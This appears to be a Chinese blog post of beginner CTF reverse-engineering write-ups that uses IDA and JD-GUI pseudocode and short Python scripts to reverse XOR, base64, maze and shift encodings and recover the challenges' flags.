<p>   strcpy()是一种用于复制的函数声明，将后面的字符串”HappyNewYear”复制到Str2中去 </p>
</li>
<li><p>Str1这里是我们需要输入的flag</p>
</li>
<li><p>之后到<code>if(!strncmp((const char *)&amp;Str1, Str2,strlen(Str2)) )</code></p>
</li>
</ul>
<p>strncmp()是用来比较的函数，strlen(Str2)表示的是获取到Str2的长度，在这个长度下进行比较</p>
<ul>
<li>根据下面的<code>result = puts(&quot;this is true flag!&quot;);</code>可以知道上面的字符串就是我们所需要的flag</li>
</ul>
<p>###flag{HappyNewYear!}</p>
<h3 id="upx脱壳"><a href="#upx脱壳" class="headerlink" title="upx脱壳"></a>upx脱壳</h3><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660631085830-205662b2-b12f-45d5-919d-bc369eb19948.png"
                      alt="image.png"
                ><br>通过题目猜测这道题考的是异或，查看字符串上面的感觉像是需要异或处理的字符<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660632460668-c1e539da-9a06-4304-b349-3e8c5b8ea2a5.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660631233178-95c6811d-ad93-446f-9ce4-6aafcf398032.png"
                      alt="image.png"
                ><br>写脚本并且运行</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="string">&#x27;f&#x27;</span>,<span class="number">0x0A</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0x0C</span>,<span class="string">&#x27;w&amp;O.@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0x0D</span>,</span><br><span class="line">       <span class="string">&#x27;Z;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&quot;M#D&#x27;</span>,<span class="number">0x0E</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">0x6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0x0F</span>,<span class="string">&#x27;G2O&#x27;</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(enc[i])==<span class="built_in">int</span>: <span class="comment">#将数字转化成字符</span></span><br><span class="line">        enc[i] = <span class="built_in">chr</span>(enc[i]) <span class="string">&#x27;&#x27;&#x27;chr()函数是用一个在range(256)内的将0~255内的整数转为字符串</span></span><br><span class="line"><span class="string">                            	第一个字母已知是f，所以不需要做异或处理&#x27;&#x27;&#x27;</span></span><br><span class="line">enc =<span class="string">&quot;&quot;</span>.join(enc)</span><br><span class="line">flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enc)):     <span class="comment">##范围是从第1位一直到字符的最后一位</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i])^<span class="built_in">ord</span>(enc[i-<span class="number">1</span>]))  <span class="comment">##ord()函数是将字符串转为整数的函数</span></span><br><span class="line"><span class="built_in">print</span>(flag) <span class="comment">##打印flag</span></span><br></pre></td></tr></table></figure></div>

<p>这里插入菜鸟教程的python内置函数界面<br><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/python/python-built-in-functions.html" >Python 内置函数 | 菜鸟教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>###flag{QianQiuWanDai_YiTongJiangHu}</p>
<h2 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a>helloword</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660633716870-4810a12e-0eee-4ba3-b2a2-5e6307033f4d.png"
                      alt="image.png"
                ><br>下载后发现是一个apk文件，我们需要用别的安卓工具来打开这个文件，直接找到main函数就能够获得flag了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660636948745-11b281e6-bf10-4e49-abdc-9b342501d5ab.png"
                      alt="image.png"
                ><br>###flag{7631a988259a00816deda84afb29430a}</p>
<h3 id="apk文件的处理"><a href="#apk文件的处理" class="headerlink" title="apk文件的处理"></a>apk文件的处理</h3><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660637182839-70c11767-49f7-4b46-b4ed-ee35948d7798.png"
                      alt="image.png"
                ><br>直接查看字符串<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660637229694-cf68381f-e725-4116-a677-003e9e812d19.png"
                      alt="image.png"
                ><br>在里面看见两串可以纳入考虑的字符串”rigth flag!\n” “e3nifIH9b_C@n@dH”<br>进入到该函数之后，看到函数的原伪代码的大概<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660637407990-1b73cba3-08de-4b20-b2d8-9d5d4dacca2c.png"
                      alt="image.png"
                ><br>v4那里进入后有一个<code>sub_411AB0</code>的函数，点进去之后发现<code>aAbcdefghijklmn</code>这个函数较可疑的点进去之后发现<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660638196822-e6b98b6e-c415-46de-882d-31d63bac0cda.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660638265034-5e4ee26e-bc46-40e8-bda7-223bd31a31f6.png"
                      alt="image.png"
                ><br>是base64编码的特征，往上逆着推，<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660640584675-d4a4e630-7d8a-45e2-aa8b-5c6305f3ad10.png"
                      alt="image.png"
                ><br>所以需要进行一个简单的减法将flag算出来，而且需要知道Str2的值就是我上面找到的奇怪的字符”e3nifIH9b_C@n@dH”,有两种方法</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;e3nifIH9b_C@n@dH&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):   <span class="comment">##范围是从0到最后</span></span><br><span class="line">    index = <span class="built_in">chr</span> (<span class="built_in">ord</span>(<span class="built_in">str</span>[i]-i))</span><br><span class="line">    flag += index    <span class="comment">##算出来之间的字符后，下一步进行base64编码的转化</span></span><br><span class="line">flag = base64.b64decode(flag)  <span class="comment">##base64.b64decode()方法，我们可以将二进制字符串解码为正常形式</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660641981806-dc2ec121-2f4d-40a9-9031-97eb943f706a.png"
                      alt="image.png"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="built_in">list</span>(<span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(str2)</span><br><span class="line"><span class="comment"># print(ord(str2[0]))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">    str2[i]= <span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i])-i) <span class="comment">#改为相减</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(str2))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ord():字符转ascii码</span></span><br><span class="line"><span class="comment">#chr():ascii码转字符</span></span><br></pre></td></tr></table></figure></div>

<p> 得到 **e2lfbDB2ZV95b3V9 **放在在线base64中解码<br>flag{i_l0ve_you}</p>
<blockquote>
<p>自己做题的时候这里出现的一个错误<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660642237255-3e0e7883-553f-43ca-bd7c-3b9c313be3ba.png"
                      alt="image.png"
                ><br>在base64包存在的情况下，为什么出不来结果<br>找了百度之后才知道原来是命名的时候出现错误了<br>因为当时命名的文件名是”base64.py“，与包base64重合了，所以会出现混乱，把名字直接改为exp.py 结果就跑出来了</p>
</blockquote>
<h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660705341952-f31e9d73-ba84-400d-8af4-a0915c4b521b.png"
                      alt="image.png"
                ><br>32位的程序，直接用IDA打开之后分析程序<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660725669019-b2e2bcdc-904f-4cc8-8114-81328924e8ed.png"
                      alt="image.png"
                ><br>发现有一串10组成的字符串，再根据下面的判断语句<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660727742861-e3ca20f3-f5ab-4781-a3c9-6392c0c14d61.png"
                      alt="image.png"
                ><br>根据11、14-18、51行可以判断为迷宫题，将上面的25位的字符串转为5x5的迷宫图<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660728087096-1378b977-0e1a-4067-97a4-cbac5b907c0f.png"
                      alt="image.png"
                ><br>从*一直走到#结合上面的操作数，所以flag就是222441144222<br>###flag{222441144222}</p>
<h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><h2 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660728280391-f07f0e0d-e4ff-44e7-a377-9c164e2165b7.png"
                      alt="image.png"
                ><br>第一步还是查看字符串，从里面找一些可以确定flag出现位置的函数与加密的伪代码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660728374275-40e54880-9a28-4f50-8424-0d0c045162b0.png"
                      alt="image.png"
                ><br>可以大致确定flag是通过这里进行加密的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660736091210-01c2540f-4323-4edd-93d1-8d0b1e36ea3f.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660737295297-c4422e92-58e1-4708-9ac7-37f5dd370d1a.png"
                      alt="image.png"
                ><br>进入v9与src之后发现都是以小端序排列的数据低位存放在低地址，高位存放在高地址处，所以需要将之前的字符倒过来看<br>而key3与key1不存在小端的情况<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660736675159-7086e6db-af35-4343-86af-edd69302d3f5.png"
                      alt="image.png"
                ><br>:::tips<br>text &#x3D; join(key3,(const char *)v9)<br>::key3 –&gt;  ‘kills’<br>::v9 –&gt; ‘wodah’ 倒过来就是 ‘hadow’<br>text &#x3D; killshadow<br>:::<br>:::tips<br>strcpy(key,key1) 将key1中的字符串输到key<br>::key1 –&gt;’ADSFK’<br>*(_QWORD *)src &#x3D; ‘SLCDN’; 倒过来是’NDCLS’<br>strcat(key ,src)将key与src字符连接起来<br>::src –&gt; ‘SLCDN’<br>key &#x3D; key1 + src –&gt; key &#x3D; ‘ADSFKNDCLS’<br>:::<br>正看代码就是：<br>:::tips<br>输入自己的字符fake flag，通过getchar()函数赋给v1<br>后面就是通过对v1的加密得到最后正确答案的flag<br>加密的过程是<code>str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;</code><br>所以说逆推v1的话就是<code>v1 =str2[v2]-97+26+key[v3%v5]-58 </code><br>并且根据上面来看我们需要得到的是v1的ASCII的编码的数值，需要将v1算出来是一个整数的形式<br>所以<code>v1 = ord(str2[v2]-97)+26*i+ord(key[v3%v5])-58</code><br>:::<br>:::tips<br>同样要注意的是这里的小写字母要全改为大写字母<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660738802756-ed4ad7fb-c542-41ed-bc08-c3dd1e1600dd.png"
                      alt="image.png"
                ><br>:::</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )  <span class="comment">//！strcmp(text, str2）--&gt;text = str2</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>所以通过伪代码逆推写出得到flag的脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;adsfkndcls&#x27;</span></span><br><span class="line">v3=<span class="number">0</span></span><br><span class="line">v5=<span class="built_in">len</span>(key)</span><br><span class="line">flag=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        v1=(<span class="built_in">ord</span>(str2[j])-<span class="number">97</span>)+<span class="number">26</span>*i+<span class="built_in">ord</span>(key[v3%v5])-<span class="number">58</span>  <span class="comment">##j替换掉v2</span></span><br><span class="line">        <span class="keyword">if</span>(v1&gt;<span class="number">65</span> <span class="keyword">and</span> v1&lt;=<span class="number">90</span>):</span><br><span class="line">            flag[j]=<span class="built_in">chr</span>(v1)  <span class="comment">#最后将ascii表示的v1转为字符</span></span><br><span class="line">        v3=v3+<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660742382123-1c6255cb-cb0b-4ea5-8dca-737db68c4864.png"
                      alt="image.png"
                ><br> ‘’’这里要给v1数值留作填充,观察到str2和key都是十位所以也是十位’’’<br>###flag{KLDQCUDFZO}</p>
<hr>
<blockquote>
<p>在flag加密：str2[v2] &#x3D; (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660739278716-3248d691-8e2e-44be-a4c7-1eb4c9e140b4.jpeg"
                      alt="b85d67b431c862f4527480c7deddefb.jpg"
                ><br>这里一开始没想通，所以花了蛮长时间去理解</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;adsfkndcls&#x27;</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">v5 = <span class="built_in">len</span>(key)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>   <span class="comment">###这里要给v1数值留作填充  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        v1 = <span class="built_in">ord</span>(str2[j]-<span class="number">97</span>)+<span class="number">26</span>*i+<span class="built_in">ord</span>(key[v3%v5])-<span class="number">58</span>  <span class="comment">##j替换掉v2</span></span><br><span class="line">        <span class="keyword">if</span>(v1&gt;<span class="number">65</span> <span class="keyword">and</span> v1&lt;=<span class="number">90</span>):</span><br><span class="line">            flag[j]=<span class="built_in">chr</span>(v1) <span class="comment">##最后将ascii表示的v1转为字符</span></span><br><span class="line">        v3=v3+<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>当然还有C的脚本，但一般都使用python来写脚本<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660742651235-6cb60dad-ea6b-4c54-b8e5-080f99c32063.png"
                      alt="20210716201716618.png"
                ></p>
<h3 id="小端序问题、拼接问题"><a href="#小端序问题、拼接问题" class="headerlink" title="小端序问题、拼接问题"></a>小端序问题、拼接问题</h3><h2 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h2><p>下载下来的题目是以class后缀的java语言的程序，所以使用JD-GUI的工具，将文件拖进去之后能够看到程序的整个过程<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660743067803-ada2a14e-f2c5-4d27-a0ef-da4f9d176e78.png"
                      alt="image.png"
                ><br>感觉像是异或处理</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, </span><br><span class="line">        <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):    </span><br><span class="line">    flag += <span class="built_in">chr</span>((key[i]-<span class="number">64</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(flag) <span class="comment">##打印flag</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660743953945-e912c048-704f-4194-bffd-f0fd506aa4ac.png"
                      alt="image.png"
                ><br>###flag{This_is_the_flag_!}</p>
<h3 id="JD-GUI-Java-XOR逆向"><a href="#JD-GUI-Java-XOR逆向" class="headerlink" title="JD-GUI[Java XOR逆向]"></a>JD-GUI[Java XOR逆向]</h3><h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><p>查看字符后好像找到了一半的flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660744056515-df816ad1-fa1c-4137-ac34-4c53b0015deb.png"
                      alt="image.png"
                ><br>f1&#x3D;GXY{do_not_<br>进入get_flag()的函数，可以看到flag的加密过程<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660744315612-371d384f-4306-4c4a-bd77-d7f44f0b3341.png"
                      alt="image.png"
                ><br>通过观察flag的排序应该是case4-&gt;case5-&gt;case1最后能够得到flag的另一半f2<br>case4中将<code>&quot;icug</code>of\x7F”&#96;复制给s,s给f2赋值，值得注意的是，计算机一般都是小端序排列，所以如果直接用字符的话肯定会报错，除非将字符倒过来，或者直接将字符转为ASCII编码再转为16进制的数。<br>case5中将上面的f2进行加密，可以看出是将字符按奇偶分开。<br>case1中是将f1与f2拼接起来<br>写脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x6F</span>, <span class="number">0x66</span>, <span class="number">0x7F</span>] <span class="comment">#这里用的是第二种方法转换</span></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">2</span>)==<span class="number">1</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(f2[i]-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(f2[i]-<span class="number">1</span>)  <span class="comment">#别忘了将转回字符串</span></span><br><span class="line"><span class="built_in">print</span>(f1+temp)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660746438081-50948afa-68fc-413d-b2da-dee68857031e.png"
                      alt="image.png"
                ><br>##flag{do_not_hate_me}</p>
<blockquote>
<p>上面的操作不知道是怎么回事，小端序被去了，忘记录屏看了呜呜呜~~<br>第二次重新开的时候就发现问题了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660747151866-2d4c8d7b-1ea0-4a74-914d-09e2844f5dac.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660747161841-44ac763c-c575-43e4-850f-5700aea0bdee.png"
                      alt="image.png"
                ><br>按下R之后变成了这串字符，这里就需要用到小端序了，所以第二个脚本就这样来的，这样看的话应该就是第一个开的姿势不对，什么勾八题目(╯▔皿▔)╯！！</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f2 = <span class="string">&#x27;\x7Ffo`guci&#x27;</span>[::-<span class="number">1</span>]  <span class="comment">#a[::-1]就是将序列a中的元素翻转</span></span><br><span class="line">f2a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        f2a += <span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f2a += <span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span>+f2a </span><br><span class="line"><span class="built_in">print</span>(flag )</span><br></pre></td></tr></table></figure></div>

<h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>直接搜索字符串，找到突破点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660747426882-ca829c24-bab5-4c41-a7fb-fcee775e26df.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660750782017-0ab563df-7b5e-4486-845f-4cd3d885f4a0.png"
                      alt="image.png"
                ><br>直接点击进入之后，发现sprintf()的函数直接将19999和0传入到占位符%d%d中，所以最后的flag是BJD{1999902069a45792d233ac}<br>###flag{1999902069a45792d233ac}</p>
<h3 id="纯拼接类题目"><a href="#纯拼接类题目" class="headerlink" title="纯拼接类题目"></a>纯拼接类题目</h3><h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660831214387-44f4f351-dd45-43d9-9c32-0258bb14b76b.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
